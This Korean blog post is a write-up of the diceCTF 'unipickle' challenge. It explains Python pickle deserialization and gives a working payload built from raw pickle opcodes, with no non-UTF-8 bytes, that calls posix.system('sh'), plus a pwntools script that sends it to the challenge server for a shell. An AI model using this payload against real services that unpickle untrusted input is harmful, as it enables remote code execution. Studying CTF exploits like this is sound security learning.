---
title: diceCTF-unipickle writeup
date: 2024-02-07 00:10:10 +0900
categories: [writeup, misc]
tags: [diceCTF]
render_with_liquid: false
---

[diceCTF](https://ctf.dicega.ng/challs)에 참가는 했는데 문제는 풀지 못했다..

![1](/assets/img/posts/2024-02-07-itsme.png)

Unipickle이라는 문제에 꽂혀서 하나라도 풀어 보자는 생각이었지만 결국 실패했다. 대회가 끝난 뒤 디스코드에서 긁어 모은 라이트업을 내 나름대로 정리해보고자 한다.

## unipickle.py

```python
#!/usr/local/bin/python
import pickle
pickle.loads(input("pickle: ").split()[0].encode())
```

문제에 첨부된 unipickle.py의 내용은 정말 간단하다.
우선 python의 pickle 모듈을 사용한다. 사용자의 입력 값을 문자열로써 받아 UTF-8로 인코딩해 바이트 값으로 만들고, 이걸 pickle.loads로 역직렬화시킨다.

## 풀이

pickle에는 보안 취약성이 존재하는데, __reduce__ 메소드를 직렬화시킬 코드에 사용한다면 스택에서 호출 가능한 객체를 가져와서 별다른 <b>검증 없이 실행</b>하게 된다.

이에 착안하여 내가 구상한 공격 코드는 다음과 같다.

```python
import pickle
import pwn

class vul(object):
    import os
    
    def __reduce__(self):
        return (self.os.system, ("/bin/sh",))

temp = pickle.dumps(vul())
temp = temp.decode

r = remote('mc.ax', 31773)
r.sendline(temp)
r.interactive()
```

자세히 살펴보면, reduce 메소드가 반환할 튜플에 self.os.system를, 그 매개변수로 /bin/sh 를 담았다.
해당 메소드가 담긴 객체를 pickle.dumps로 직렬화했고, 직렬화된 바이트 값을 decode로 UTF-8 인코딩해 서버의 input 함수에 전달하고자 했다.

잘 실행될 줄 알았으나...  

![2](/assets/img/posts/2024-02-07-error.png)

decode 부분에서 막혔다. 이유는 UTF-8로 인코딩이 불가능한 바이트 값을 포함하고 있었기 때문.  
서버는 입력단의 split 때문에 문자열만 처리하고 있기 때문에 이를 우회하기 위해선 UTF-8로 정상적인 디코딩이 가능한 직렬화된 바이트 값을 만들어야 한다.

필자는 이 이상 나아가지 못했지만, 이후는 디스코드에서 찾은 풀이들을 정리한 내용을 기술하겠다.

### 인코딩 가능한 바이트 시퀀스 만들기

직렬화된 바이트 값의 구조를 보기 위해 'pickletools' 모듈을 사용할 수 있다. 내가 만든 코드의 바이트 값을 상세하게 확인하기 위해 아래의 코드를 실행시켰다.

```python
from pickle import *
from pwn import *
import pickletools

class vul(object):
    import os
    
    def __reduce__(self):
        return (self.os.system, ("/bin/sh",))

p = pickle.dumps(vul())
pickletools.dis(p)
print(p)
```

![3](/assets/img/posts/2024-02-07-howcan.png)

먼저 주의해야 할 점은 이 구조는 운영체제마다 조금씩 다르다는 것이다. 특히 윈도우에선 os.system을 nt.system으로 받고 리눅스에선 posix.system으로 받는다.

바이트 시퀀스에서 proto(\x80), frame(\x95), memoize(\x94)같은 명령어들은 utf-8로 인코딩이 불가능하다.  
따라서 이들을 포함하지 않고 우리가 원하는 기능을 수행하는 직렬화 바이트 시퀀스를 만들어야 한다.

아래는 인코딩이 가능한 바이트를 만들고, 그것을 목표 셸에 주입하는 코드이다.

```python
from pickle import *
from pwn import *

p = SHORT_BINSTRING + b'\x05posix'
p += SHORT_BINSTRING + b'\x06system'
p += BINPUT + b'\xc2' + STACK_GLOBAL
p += SHORT_BINSTRING + b'\x02sh'
p += BINPUT + b'\xc3' + TUPLE1
p += REDUCE
p += STOP

r = remote('mc.ax', 31773)
r.sendline(p)
r.interactive()
```

p의 값을 pickletools를 통해 자세히 살펴보자.
```shell
0: U    SHORT_BINSTRING 'posix'
7: U    SHORT_BINSTRING 'system'
15: q    BINPUT     194
17: \x93 STACK_GLOBAL
18: U    SHORT_BINSTRING 'sh'
22: q    BINPUT     195
24: \x85 TUPLE1
25: R    REDUCE
26: .    STOP
```

- U (SHORT_BINSTRING): 짧은 이진 문자열의 표시를 알림. 이 명령어 다음에는 문자열의 길이와 문자열 데이터가 오게 됨. 'posix'와 'system'이 이 방식으로 저장되었음.

- q (BINPUT): 객체를 메모 테이블에 저장하고, 이후 참조를 위한 인덱스 번호를 할당. 여기서는 194와 195가 그 인덱스로 사용됨.

- \x93 (STACK_GLOBAL): 스택의 최상위 두 항목을 사용하여 모듈과 이름을 찾아 그에 해당하는 객체를 스택에 적재합니다. 이 경우, 'posix' 모듈의 'system' 함수를 찾는 데 사용.

- \x85 (TUPLE1): 스택의 최상위 항목을 사용하여 단일 항목 튜플을 생성.

- R (REDUCE): 스택의 최상위 두 항목을 사용하여 __reduce__ 연산을 수행한다. 여기서는 함수(예: system)에 인자(예: 'sh')를 적용하여 호출 가능한 객체를 생성함.

- . (STOP): 직렬화 프로세스의 종료.

위의 설명과 같이 proto(\x80), frame(\x95), memoize(\x94) 같은 명령어를 쓰지 않고 다른 명령어들을 잘 조합하여 인코딩이 가능한 값으로만 바이트 시퀀스를 제작하였다는 것을 알 수 있다.

이걸 그대로 실행시켜 보면...
![3](/assets/img/posts/2024-02-07-flag.png)

예상했던 대로 셸이 실행되고, 파일을 마음대로 탐색할 수 있다.

## 후기

문제가 짧고 파훼 방법이 명확하게 보여서 그런지 포기하지 않고 계속 도전하게 된 것 같다.  
하지만 풀이 방법을 보니 시간을 계속 줬었더라도 과연 풀 수 있었을까 싶긴 하다.  
그래도 이번 기회에 잘 사용하지 않던 pickle 모듈에 대해서 깊게 이해하게 된 것 같아 얻어가는 게 있으니 다행이라는 생각이 든다.